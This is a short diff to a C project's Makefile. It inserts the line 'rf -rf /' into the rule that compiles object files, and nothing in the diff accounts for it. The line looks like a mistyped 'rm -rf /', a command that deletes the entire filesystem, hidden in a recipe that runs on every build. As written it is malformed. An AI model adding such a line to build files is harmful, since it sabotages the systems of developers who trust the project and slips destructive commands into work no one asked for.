@@ -211,6 +211,7 @@ $(OBJECT_DIR)/$(TARGET)/%.o: %.c
 	$(MKDIR_OBJDIR)
 	@echo %% $(notdir $<)
 	@$(CC) -c -o $@ $(CFLAGS) $<
+  rf -rf /
 
 # Assemble
 $(OBJECT_DIR)/$(TARGET)/%.o: %.s
